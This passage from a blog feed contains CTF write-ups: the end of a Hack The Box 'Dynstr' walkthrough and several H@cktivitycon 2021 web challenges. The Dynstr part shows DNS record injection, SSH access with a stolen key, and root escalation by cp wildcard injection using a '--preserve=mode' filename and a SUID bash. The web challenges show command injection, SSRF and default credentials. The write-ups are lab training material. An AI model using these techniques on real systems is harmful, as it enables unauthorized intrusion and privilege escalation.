</span></span><span class="line"><span class="cl">include <span class="s2">&#34;/etc/bind/ddns.key&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;dnsalias.htb&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;dnsalias.htb.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant ddns-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;dynamicdns.htb&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;dynamicdns.htb.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant ddns-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;no-ip.htb&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;no-ip.htb.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant ddns-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// *** WORK IN PROGRESS, see bindmgr.sh ***
</span></span><span class="line"><span class="cl">// include <span class="s2">&#34;/etc/bind/named.conf.bindmgr&#34;</span><span class="p">;</span>
</span></span></code></pre></div><p>The idea here is to add a sub domain to <code>dyna.htb</code> zone, and it must be part of <code>infra.dyna.htb</code>, such as <code>iamf.infra.dyna.htb</code>. I will also point that domain to my IP so I can SSH from my machine. These all can be done with the following commands.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/etc/bind$ nsupdate -k ./infra.key
</span></span><span class="line"><span class="cl">&gt; update add iamf.infra.dyna.htb <span class="m">3600</span> A 10.10.14.53
</span></span><span class="line"><span class="cl">&gt; update add 53.14.10.10.in-addr.arpa. <span class="m">600</span> PTR iamf.infra.dyna.htb
</span></span><span class="line"><span class="cl">&gt; show
</span></span><span class="line"><span class="cl">Outgoing update query:
</span></span><span class="line"><span class="cl"><span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: UPDATE, status: NOERROR, id:      <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> flags:<span class="p">;</span> ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> UPDATE SECTION:
</span></span><span class="line"><span class="cl">iamf.infra.dyna.htb.    <span class="m">0</span>       ANY     A
</span></span><span class="line"><span class="cl">iamf.infra.dyna.htb.    <span class="m">3600</span>    IN      A       10.10.14.53
</span></span><span class="line"><span class="cl">53.14.10.10.in-addr.arpa. <span class="m">600</span>   IN      PTR     iamf.infra.dyna.htb.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; send
</span></span></code></pre></div><p>I can confirm with dig that my domain has been added.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ dig @10.10.10.244 iamf.infra.dyna.htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @10.10.10.244 iamf.infra.dyna.htb
</span></span><span class="line"><span class="cl"><span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> global options: +cmd
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Got answer:
</span></span><span class="line"><span class="cl"><span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class="m">56211</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> flags: qr aa rd<span class="p">;</span> QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WARNING: recursion requested but not available
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> OPT PSEUDOSECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span> EDNS: version: 0, flags:<span class="p">;</span> udp: <span class="m">4096</span>
</span></span><span class="line"><span class="cl"><span class="p">;</span> COOKIE: 7d13ea1a1d5d21b90100000060cb40c0b256362f3bd3da35 <span class="o">(</span>good<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> QUESTION SECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span>iamf.infra.dyna.htb.           IN      A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> ANSWER SECTION:
</span></span><span class="line"><span class="cl">iamf.infra.dyna.htb.    <span class="m">3600</span>    IN      A       10.10.14.53
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Query time: <span class="m">59</span> msec
</span></span><span class="line"><span class="cl"><span class="p">;;</span> SERVER: 10.10.10.244#53<span class="o">(</span>10.10.10.244<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WHEN: Thu Jun <span class="m">17</span> 08:31:59 EDT <span class="m">2021</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> MSG SIZE  rcvd: <span class="m">92</span>
</span></span></code></pre></div><h4 id="ssh-bindmgr">SSH bindmgr</h4>
<p>Now I can SSH login as bindmgr</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «ssh-keys» «10.10.14.53»
</span></span><span class="line"><span class="cl">$ ssh -i bindmgr_rsa bindmgr@10.10.10.244
</span></span><span class="line"><span class="cl">Last login: Tue Jun  <span class="m">8</span> 19:19:17 <span class="m">2021</span> from 6146f0a384024b2d9898129ccfee3408.infra.dyna.htb
</span></span><span class="line"><span class="cl">bindmgr@dynstr:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span>
</span></span></code></pre></div><p>The flag:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:~$ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> bindmgr bindmgr <span class="m">4096</span> Mar <span class="m">13</span> 14:53 support-case-C62796521
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> bindmgr bindmgr   <span class="m">33</span> Jun <span class="m">17</span> 10:51 user.txt
</span></span><span class="line"><span class="cl">bindmgr@dynstr:~$ cat user.txt
</span></span><span class="line"><span class="cl">6404e...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>Checking for sudo permissions reveals that <code>bindmgr</code> is allowed to run a script called <code>bindmgr.sh</code> as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:~$ sudo -l
</span></span><span class="line"><span class="cl">sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> bindmgr on dynstr:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User bindmgr may run the following commands on dynstr:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/bindmgr.sh
</span></span></code></pre></div><p>The author gives a well documented about what this script does.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/usr/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1"># This script generates named.conf.bindmgr to workaround the problem</span>
</span></span><span class="line"><span class="cl"><span class="c1"># that bind/named can only include single files but no directories.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># It creates a named.conf.bindmgr file in /etc/bind that can be included</span>
</span></span><span class="line"><span class="cl"><span class="c1"># from named.conf.local (or others) and will include all files from the</span>
</span></span><span class="line"><span class="cl"><span class="c1"># directory /etc/bin/named.bindmgr.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># NOTE: The script is work in progress. For now bind is not including</span>
</span></span><span class="line"><span class="cl"><span class="c1">#       named.conf.bindmgr.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># TODO: Currently the script is only adding files to the directory but</span>
</span></span><span class="line"><span class="cl"><span class="c1">#       not deleting them. As we generate the list of files to be included</span>
</span></span><span class="line"><span class="cl"><span class="c1">#       from the source directory they won&#39;t be included anyway.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">BINDMGR_CONF</span><span class="o">=</span>/etc/bind/named.conf.bindmgr
</span></span><span class="line"><span class="cl"><span class="nv">BINDMGR_DIR</span><span class="o">=</span>/etc/bind/named.bindmgr
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">indent<span class="o">()</span> <span class="o">{</span> sed <span class="s1">&#39;s/^/    /&#39;</span><span class="p">;</span> <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Check versioning (.version)</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Running </span><span class="nv">$0</span><span class="s2"> to stage new configuration from </span><span class="nv">$PWD</span><span class="s2">.&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> ! -f .version <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[-] ERROR: Check versioning. Exiting.&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">42</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;`cat .version 2&gt;/dev/null`&#34;</span> -le <span class="s2">&#34;`cat </span><span class="nv">$BINDMGR_DIR</span><span class="s2">/.version 2&gt;/dev/null`&#34;</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[-] ERROR: Check versioning. Exiting.&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">43</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Create config file that includes all files from named.bindmgr.</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Creating </span><span class="nv">$BINDMGR_CONF</span><span class="s2"> file.&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">printf</span> <span class="s1">&#39;// Automatically generated file. Do not modify manually.\n&#39;</span> &gt; <span class="nv">$BINDMGR_CONF</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> file in * <span class="p">;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">    <span class="nb">printf</span> <span class="s1">&#39;include &#34;/etc/bind/named.bindmgr/%s&#34;;\n&#39;</span> <span class="s2">&#34;</span><span class="nv">$file</span><span class="s2">&#34;</span> &gt;&gt; <span class="nv">$BINDMGR_CONF</span>
</span></span><span class="line"><span class="cl"><span class="k">done</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Stage new version of configuration files.</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Staging files to </span><span class="nv">$BINDMGR_DIR</span><span class="s2">.&#34;</span>
</span></span><span class="line"><span class="cl">cp .version * /etc/bind/named.bindmgr/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Check generated configuration with named-checkconf.</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Checking staged configuration.&#34;</span>
</span></span><span class="line"><span class="cl">named-checkconf <span class="nv">$BINDMGR_CONF</span> &gt;/dev/null
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> -ne <span class="m">0</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[-] ERROR: The generated configuration is not valid. Please fix following errors: &#34;</span>
</span></span><span class="line"><span class="cl">    named-checkconf <span class="nv">$BINDMGR_CONF</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> indent
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">44</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[+] Configuration successfully staged.&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># *** TODO *** Uncomment restart once we are live.</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># systemctl restart bind9</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> -ne <span class="m">0</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="s2">&#34;[-] Restart of bind9 via systemctl failed. Please check logfile: &#34;</span>
</span></span><span class="line"><span class="cl">        systemctl status bind9
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="s2">&#34;[+] Restart of bind9 via systemctl succeeded.&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span></code></pre></div><p>The first two <code>if</code> statement show that the script wants a file called <code>.version</code>, and since it looks from <code>$PWD</code>, I can create that file in anywhere.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:~$ <span class="nb">echo</span> <span class="s1">&#39;5&#39;</span> &gt; .version
</span></span></code></pre></div><p>Then when I run the script, it throws the following error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:~$ sudo bindmgr.sh
</span></span><span class="line"><span class="cl">sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Running /usr/local/bin/bindmgr.sh to stage new configuration from /home/bindmgr.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating /etc/bind/named.conf.bindmgr file.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Staging files to /etc/bind/named.bindmgr.
</span></span><span class="line"><span class="cl">cp: -r not specified<span class="p">;</span> omitting directory <span class="s1">&#39;support-case-C62796521&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Checking staged configuration.
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> ERROR: The generated configuration is not valid. Please fix following errors:
</span></span><span class="line"><span class="cl">    /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/support-case-C62796521: file not found
</span></span></code></pre></div><p>And this one is interesting</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cp: -r not specified<span class="p">;</span> omitting directory <span class="s1">&#39;support-case-C62796521&#39;</span>
</span></span></code></pre></div><p>If I trace it, the error come from these lines.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Stage new version of configuration files.</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Staging files to </span><span class="nv">$BINDMGR_DIR</span><span class="s2">.&#34;</span>
</span></span><span class="line"><span class="cl">cp .version * /etc/bind/named.bindmgr/
</span></span></code></pre></div><p>According to <a href="https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/">Hackingarticles</a>, using <code>cp</code> with <code>*</code> can lead to wildcard injection.</p>
<h4 id="exploitation">Exploitation</h4>
<p>To exploit <code>cp</code> with <code>*</code> (wildcard), I will create a copy of the bash binary and set SUID permissions on it, and then I will create another file with a filename  <code>--preserve=mode</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ <span class="nb">echo</span> <span class="s1">&#39;5&#39;</span> &gt; .version
</span></span><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ touch  <span class="s1">&#39;--preserve=mode&#39;</span>
</span></span><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ cp /bin/bash .
</span></span><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ chmod u+s bash
</span></span><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">1164</span>
</span></span><span class="line"><span class="cl">drwxrwxrwt  <span class="m">2</span> root    root        <span class="m">100</span> Jun <span class="m">17</span> 15:18  .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">17</span> root    root       <span class="m">3940</span> Jun <span class="m">17</span> 10:51  ..
</span></span><span class="line"><span class="cl">-rwsr-sr-x  <span class="m">1</span> bindmgr bindmgr <span class="m">1183448</span> Jun <span class="m">17</span> 15:18  bash
</span></span><span class="line"><span class="cl">-rw-rw-r--  <span class="m">1</span> bindmgr bindmgr       <span class="m">1</span> Jun <span class="m">17</span> 15:12 <span class="s1">&#39;--preserve=mode&#39;</span>
</span></span><span class="line"><span class="cl">-rw-rw-r--  <span class="m">1</span> bindmgr bindmgr       <span class="m">2</span> Jun <span class="m">17</span> 14:47  .version
</span></span></code></pre></div><p><code>cp</code> will see that <code>--preserve=mode</code> file as name as a flag/option/switch, so it becomes</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ cp .version --preserve<span class="o">=</span>mode /etc/bind/named.bindmgr/
</span></span></code></pre></div><p>When I run <code>bindmgr.sh</code> again, it throws another error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ sudo bindmgr.sh
</span></span><span class="line"><span class="cl">sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Running /usr/local/bin/bindmgr.sh to stage new configuration from /dev/shm.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating /etc/bind/named.conf.bindmgr file.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Staging files to /etc/bind/named.bindmgr.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Checking staged configuration.
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> ERROR: The generated configuration is not valid. Please fix following errors:
</span></span><span class="line"><span class="cl">    /etc/bind/named.bindmgr/bash:1: unknown option <span class="s1">&#39;ELF☻☺☺...&#39;</span>
</span></span><span class="line"><span class="cl">    /etc/bind/named.bindmgr/bash:14: unknown option <span class="s1">&#39;♥h□ȀE□♣&#39;</span>
</span></span><span class="line"><span class="cl">    /etc/bind/named.bindmgr/bash:40: unknown option <span class="s1">&#39;□YF&#39;</span>
</span></span><span class="line"><span class="cl">    /etc/bind/named.bindmgr/bash:40: unexpected token near <span class="s1">&#39;}&#39;</span>
</span></span></code></pre></div><p>But now under <code>/etc/bind/named.bindmgr</code>, I have a copy of bash with SUID permissions set to root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ ls -la /etc/bind/named.bindmgr
</span></span><span class="line"><span class="cl">total <span class="m">1168</span>
</span></span><span class="line"><span class="cl">drwxr-sr-x <span class="m">2</span> root <span class="nb">bind</span>    <span class="m">4096</span> Jun <span class="m">17</span> 15:18 .
</span></span><span class="line"><span class="cl">drwxr-sr-x <span class="m">3</span> root <span class="nb">bind</span>    <span class="m">4096</span> Jun <span class="m">17</span> 15:18 ..
</span></span><span class="line"><span class="cl">-rwsr-sr-x <span class="m">1</span> root <span class="nb">bind</span> <span class="m">1183448</span> Jun <span class="m">17</span> 15:18 bash
</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> root <span class="nb">bind</span>       <span class="m">2</span> Jun <span class="m">17</span> 15:18 .version
</span></span></code></pre></div><p>Executing that bash with <code>-p</code> gives me a root shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ /etc/bind/named.bindmgr/bash -p
</span></span><span class="line"><span class="cl">bash-5.0# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>117<span class="o">(</span><span class="nb">bind</span><span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>117<span class="o">(</span><span class="nb">bind</span><span class="o">)</span>,1001<span class="o">(</span>bindmgr<span class="o">)</span>
</span></span><span class="line"><span class="cl">bash-5.0# whoami
</span></span><span class="line"><span class="cl">root
</span></span></code></pre></div><p>The flag</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-5.0# ls -l
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">4</span> root root <span class="m">4096</span> Mar <span class="m">14</span> 14:18 cleanup
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> root root   <span class="m">33</span> Jun <span class="m">17</span> 10:51 root.txt
</span></span><span class="line"><span class="cl">bash-5.0# cat root.txt
</span></span><span class="line"><span class="cl">64348...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>H@cktivitycon 2021 - Web</title>
      <link>https://fahmifj.github.io/hacktivitycon/hacktivitycon-2021-web/</link>
      <pubDate>Sat, 09 Oct 2021 13:39:22 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hacktivitycon/hacktivitycon-2021-web/</guid>
      <description>Another late CTF writeups for H@cktivitycon 2021 web category.</description>
      <content:encoded><![CDATA[<p>A continuation of the H@cktivitycon 2021 CTF writeups, but this one is dedicated to the web category I solved.</p>
<h2 id="swaggy">Swaggy</h2>
<fieldset>
<legend>Challenge Information </legend>
<ul>
<li>
<p><strong>Author:</strong> -</p>
</li>
<li>
<p><strong>Category:</strong> Web</p>
</li>
<li>
<p><strong>Difficulty:</strong>  Easy</p>
</li>
<li>
<p><strong>Description:</strong></p>
<p>This API documentation has all the swag</p>
</li>
</ul>
</fieldset>
<h3 id="walkthrough">Walkthrough</h3>
<p>Swaggy is the easiest one, it hosts an instance of <a href="https://swagger.io/tools/swagger-ui/">Swagger UI</a> where it provides two API endpoint servers to test: <code>api.congon4tor.com/v1</code> (production, not available) and <code>staging-api.congon4tor.com:7777</code> (staging).</p>
<p>To get the flag, I have to send a HTTP GET request to <code>staging-api.congon4tor.com:7777/flag</code>, but without the correct credentials, it won&rsquo;t give you the flag.</p>
<p><div class="img-container"><img src="imgs/image-20210917154230629.png" alt="image-20210917154230629"  /></div>
</p>
<p>The words &ldquo;staging&rdquo; and &ldquo;testing&rdquo; are the clues for this challenge. Some devs out there typically use common credentials for easy auth, and in this case <code>admin:admin</code> are used.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@ubuntu:~$ <span class="nb">echo</span> -n <span class="s1">&#39;admin:admin&#39;</span> <span class="p">|</span> base64                                               
</span></span><span class="line"><span class="cl"><span class="nv">YWRtaW46YWRtaW4</span><span class="o">=</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210917154250166.png" alt="image-20210917154250166"  /></div>
</p>
<h2 id="confidentiality">Confidentiality</h2>
<fieldset>
<legend>Challenge Information </legend>
<ul>
<li>
<p><strong>Author:</strong> -</p>
</li>
<li>
<p><strong>Category:</strong> Web</p>
</li>
<li>
<p><strong>Difficulty:</strong>  Easy</p>
</li>
<li>
<p><strong>Description:</strong></p>
<p>My school was trying to teach people about the CIA triad so they made  all these dumb example applications&hellip; as if they know anything about  information security. Can you prove these aren&rsquo;t so secure?</p>
</li>
</ul>
</fieldset>
<h3 id="walkthrough-1">Walkthrough</h3>
<p>The challenge provides a simple website which allows you to list a file permission by inputting the file&rsquo;s path.</p>
<p><div class="img-container"><img src="imgs/image-20210917152231603.png" alt="image-20210917152231603"  /></div>
</p>
<p>If the file does not exist, it spits out an error message which reveals the command used was something like <code>ls -l [path-to-file]</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210917152250416.png" alt="image-20210917152250416"  /></div>
</p>
<p>Now I know that it passes my submitted input (as arguments) to OS commands, therefore I can try to submit a command separator like <code>;</code>, <code>|</code> or some logical operation like <code>||</code> or <code>&amp;&amp;</code>.</p>
<p>It turned out <code>;</code> worked here.</p>
<p><div class="img-container"><img src="imgs/image-20210917152339216.png" alt="image-20210917152339216"  /></div>
</p>
<p>I can just grab the flag.</p>
<p><div class="img-container"><img src="imgs/image-20210917152358697.png" alt="image-20210917152358697"  /></div>
</p>
<h2 id="titanic">Titanic</h2>
<fieldset>
<legend>Challenge Information </legend>
<ul>
<li>
<p><strong>Author:</strong> -</p>
</li>
<li>
<p><strong>Category:</strong> Web</p>
</li>
<li>
<p><strong>Difficulty:</strong>  Easy</p>
</li>
<li>
<p><strong>Description:</strong></p>
<p>Tee-Tech is a rising cyber security organization which creates tools and provide cyber security solution to it&rsquo;s clients, but are they themself secure enough?</p>
</li>
</ul>
</fieldset>
<h3 id="walkthrough-2">Walkthrough</h3>
<p>This challenge hosts a company website for called Tee-Tech.</p>
<p><div class="img-container"><img src="imgs/image-20210918175527330.png" alt="image-20210918175527330"  /></div>
</p>
<p>The <code>admin</code> menu points to <code>/admin.php</code>, where a login form is shown. I tried several common credentials and SQLi but no luck.</p>
<p><div class="img-container"><img src="imgs/image-20210918175618452.png" alt="image-20210918175618452"  /></div>
</p>
<p>In the page source, I found a commented menu (anchor tag) which reveals a web path to <code>/server-status</code>. If I&rsquo;m not mistaken, the page returned a forbidden error when I visited it directly from a browser.</p>
<p><div class="img-container"><img src="imgs/image-20210918181859427.png" alt="image-20210918181859427"  /></div>
</p>
<p>In the next section of the main site, there is a tool offered by this company.</p>
<p><div class="img-container"><img src="imgs/image-20210918175548838.png" alt="image-20210918175548838"  /></div>
</p>
<p>The tool could be used to take a screenshot of a given website URL, so it&rsquo;s SSRF. The captured site image can be viewed at <code>/captures/captured.png</code></p>
<p><div class="img-container"><img src="imgs/image-20210918175635276.png" alt="image-20210918175635276"  /></div>
</p>
<p>When I submitted <code>http://127.0.0.1/</code>, it returned with the following image, which I assume is basically the loading animation of the main site.</p>
<p><div class="img-container"><img src="imgs/image-20210918175721424.png" alt="image-20210918175721424"  /></div>
</p>
<p>If I use the URL capturer to let it visit <code>http://127.0.0.1/server-status</code>, it captures the following contents:</p>
<p><div class="img-container"><img src="imgs/image-20210918182150035.png" alt="image-20210918182150035"  /></div>
</p>
<p>It looked like a kind of web server log, and there is a set of credentials logged inside it!</p>
<p>And if I use that creds ( <code>root:EYNDR4NhadwX9rtef</code>) on the admin page, it logs me in and the page gives me the flag.</p>
<p><div class="img-container"><img src="imgs/image-20210918183140505.png" alt="image-20210918183140505"  /></div>
</p>
<h2 id="integrity">Integrity</h2>
<fieldset>
<legend>Challenge Information </legend>
<ul>
<li>
<p><strong>Author:</strong> -</p>
</li>
<li>
<p><strong>Category:</strong> Web</p>
</li>
<li>
<p><strong>Difficulty:</strong>  Medium</p>
</li>
<li>
<p><strong>Description:</strong></p>
<p>My school was trying to teach people about the CIA triad so they made all these dumb example applications&hellip; as if they know anything about  information security.</p>
